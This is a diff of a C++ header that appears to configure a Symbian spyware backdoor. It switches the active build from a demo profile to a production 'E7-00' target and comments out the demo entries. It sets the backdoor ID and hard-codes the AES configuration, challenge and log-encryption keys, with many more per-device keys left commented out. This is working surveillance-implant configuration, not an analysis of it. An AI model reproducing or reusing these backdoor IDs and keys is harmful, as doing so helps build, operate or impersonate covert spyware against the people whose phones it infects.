@@ -24,8 +24,9 @@
 //_LIT8(KVERSION,"\x81\x51\xed\x77");  //2012041601  8.0 
 //_LIT8(KVERSION,"\x82\x51\xed\x77");  //2012041602  8.04 
 //_LIT8(KVERSION,"\x19\xa5\xed\x77");  //2012063001  8.1 
-_LIT8(KVERSION,"\x1a\xa5\xed\x77");  //2012063002  8.1.4
-//_LIT8(KVERSION,"\x6d\x14\xee\x77");  //2012091501  8.2
+//_LIT8(KVERSION,"\x1a\xa5\xed\x77");  //2012063002  8.1.4
+_LIT8(KVERSION,"\xed\x39\xee\x77");  //2012101101  8.2
+
 
 // KEY Section
 
@@ -47,8 +48,8 @@ _LIT8(KIV, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00");
 //_LIT8(KBACKDOORID, "RCS_0000000976\x00\x00");    //backdoor su prod/castore E71PasswdAgent
 //_LIT8(KBACKDOORID, "RCS_0000000846\x00\x00");    //backdoor su prod/castore N96AdvConf
 //_LIT8(KBACKDOORID, "RCS_0000000125\x00\x00");    //backdoor su prod/castore N96
-//_LIT8(KBACKDOORID, "RCS_0000000917\x00\x00");    //backdoor su prod/castore E7-00
-_LIT8(KBACKDOORID, "RCS_0000000184\x00\x00");    //backdoor su demo E7Demo
+_LIT8(KBACKDOORID, "RCS_0000000917\x00\x00");    //backdoor su prod/castore E7-00
+//_LIT8(KBACKDOORID, "RCS_0000000184\x00\x00");    //backdoor su demo E7Demo
 //_LIT8(KBACKDOORID, "RCS_0000000987\x00\x00");	//backdoor su castore N97Mini
 //_LIT8(KBACKDOORID, "RCS_0000000061\x00\x00");	//backdoor su polluce N97Mini
 //_LIT8(KBACKDOORID, "RCS_0000000005\x00\x00");	//backdoor su demo E71
@@ -66,8 +67,8 @@ _LIT8(KBACKDOORID, "EMp7Ca7-fpOBIr\x00\x00");  //since 8.1.4
 //_LIT8(KAES_CONFIG_KEY,"\x18\x97\x09\xfc\xab\xfb\x5c\x66\xf1\xc9\xd7\xa3\x0b\xf3\xbe\x1b"); //RCS_0000000941 N96Test castore
 //_LIT8(KAES_CONFIG_KEY,"\xf8\x4d\xbe\xec\x82\x5b\x60\x7b\x86\x8e\x96\x33\x65\x16\xaa\x89"); //RCS_0000000846 N96AdvConf 8.0 castore
 //_LIT8(KAES_CONFIG_KEY,"\x7e\x0f\x09\xbe\xd0\x5d\x4f\x0e\xa6\xb7\x59\x4e\xfa\x1d\x4c\xdb\xb6\x10\x15\x8c\xd6\x36\x5c\x47\x0e\x7a\x6b\x6a\xec\x6b\x00\x4a"); //8.0 //RCS_0000000125  //N96 prod/castore
-//_LIT8(KAES_CONFIG_KEY,"\x8c\xae\x3c\x42\x86\xe5\xab\x54\x34\x13\xcc\x92\xd7\x0b\x2a\x72"); //RCS_0000000917  //E7-00 prod/castore
-_LIT8(KAES_CONFIG_KEY,"\xaa\xb9\x0f\x3c\x23\x79\xc7\x61\x88\x83\x25\x5a\x9c\xd6\xb0\xe2"); //RCS_0000000184  //E7Demo demo
+_LIT8(KAES_CONFIG_KEY,"\x8c\xae\x3c\x42\x86\xe5\xab\x54\x34\x13\xcc\x92\xd7\x0b\x2a\x72"); //RCS_0000000917  //E7-00 prod/castore
+//_LIT8(KAES_CONFIG_KEY,"\xaa\xb9\x0f\x3c\x23\x79\xc7\x61\x88\x83\x25\x5a\x9c\xd6\xb0\xe2"); //RCS_0000000184  //E7Demo demo
 //_LIT8(KAES_CONFIG_KEY,"\x21\x52\x53\x25\xa9\x39\x2f\x35\xc9\xe7\xe7\xeb\xea\xe5\x18\x87"); //RCS_0000000976  //E71PasswdAgent prod/castore
 //_LIT8(KAES_CONFIG_KEY,"\x4f\x45\xc5\xbf\x09\x47\x0f\x6f\xc0\xcf\x03\xb6\xea\x4d\x5d\x31"); //RCS_0000000987  //N97Mini castore
 //_LIT8(KAES_CONFIG_KEY,"\x29\x1e\x2a\x86\xb5\x8a\x6c\x03\x85\x92\x61\xd6\x52\xcc\xec\x8e"); //RCS_0000000061  //N97Mini polluce
@@ -79,8 +80,8 @@ _LIT8(KAES_CONFIG_KEY, "6uo_E0S4w_FD0j9NEhW2UpFw9rwy90LY");  //since 8.1.4
 
 //Challenge key or Signature, the same for all bkdoors on the same server
 #ifdef _DEBUG
-_LIT8(KAES_CHALLENGE_KEY, "\xe1\x51\x59\xf7\x4b\x56\x7d\x4c\x68\x42\xb6\x9b\xb1\xe3\x41\x27"); //rcs-demo
-//_LIT8(KAES_CHALLENGE_KEY, "\x57\x2e\xbc\x94\x39\x12\x81\xcc\xf5\x3a\x85\x13\x30\xbb\x0d\x99"); //Signature 8.0 castore
+//_LIT8(KAES_CHALLENGE_KEY, "\xe1\x51\x59\xf7\x4b\x56\x7d\x4c\x68\x42\xb6\x9b\xb1\xe3\x41\x27"); //rcs-demo
+_LIT8(KAES_CHALLENGE_KEY, "\x57\x2e\xbc\x94\x39\x12\x81\xcc\xf5\x3a\x85\x13\x30\xbb\x0d\x99"); //Signature 8.0 castore
 //_LIT8(KAES_CHALLENGE_KEY, "\x66\x3b\xa6\x70\x50\x2a\x7b\xe4\x68\xf7\x00\x79\xfb\x69\xee\xfd"); //Signature 8.0 polluce
 //_LIT8(KAES_CHALLENGE_KEY, "840da4c68e7dbca9f927de9314e0b586"); //preprod/polluce
 #else
@@ -98,8 +99,8 @@ _LIT8(KAES_CHALLENGE_KEY, "ANgs9oGFnEL_vxTxe9eIyBx5lZxfd6QZ");  // since 8.1.4
 //_LIT8(KAES_LOGS_KEY,"\x55\xd5\x26\x00\xce\x46\xd5\x77\x12\xaf\xde\x40\xd1\x2b\x22\x92");  // RCS_0000000941 N96Test su castore
 //_LIT8(KAES_LOGS_KEY,"\x24\xcf\x7e\x73\x35\x65\x6b\x1b\x57\x30\x4e\x6b\x8c\x1e\x5b\xce");  // RCS_0000000846 // N96AdvConf 8.0 su castore
 //_LIT8(KAES_LOGS_KEY, "\x02\xab\x00\xbe\x97\xa4\x61\xfe\xdf\x9c\xee\xac\xb0\xef\x73\xf3\x68\x99\x2c\xad\x79\xf2\x5c\x8e\x26\xa7\x67\x3b\x7f\xb7\xb9\x40");  //8.0 //RCS_0000000125  //N96 prod/castore
-//_LIT8(KAES_LOGS_KEY, "\x4f\x51\x94\x26\xbb\xad\x92\x1d\xc4\x23\x25\xab\xaf\x2e\xa7\x14");  //RCS_0000000917  //E7-00 prod/castore
-_LIT8(KAES_LOGS_KEY, "\xd0\xd6\x9c\x9d\xeb\x9a\xea\xb8\xbe\x8e\xf1\x0c\xaa\x8d\xa1\x27");  //RCS_0000000184  //E7Demo demo
+_LIT8(KAES_LOGS_KEY, "\x4f\x51\x94\x26\xbb\xad\x92\x1d\xc4\x23\x25\xab\xaf\x2e\xa7\x14");  //RCS_0000000917  //E7-00 prod/castore
+//_LIT8(KAES_LOGS_KEY, "\xd0\xd6\x9c\x9d\xeb\x9a\xea\xb8\xbe\x8e\xf1\x0c\xaa\x8d\xa1\x27");  //RCS_0000000184  //E7Demo demo
 //_LIT8(KAES_LOGS_KEY, "\x31\x03\x25\x37\xaa\xa6\x4c\xc8\xbe\x68\x3a\xc5\x47\xf5\x87\x28");  //RCS_0000000976  //E71PasswdAgent prod/castore
 //_LIT8(KAES_LOGS_KEY, "\x40\xf2\x0d\x9e\x2e\xe4\x80\x59\x1b\x85\x57\xe3\xdb\x38\xfd\xcc");  //RCS_0000000987  //N97Mini castore
 //_LIT8(KAES_LOGS_KEY, "\x9b\xd7\x39\x3b\xfe\xa8\x6b\x91\x14\x66\x19\xc4\x2a\xe7\x16\x1f");  //RCS_0000000061  //N97Mini polluce
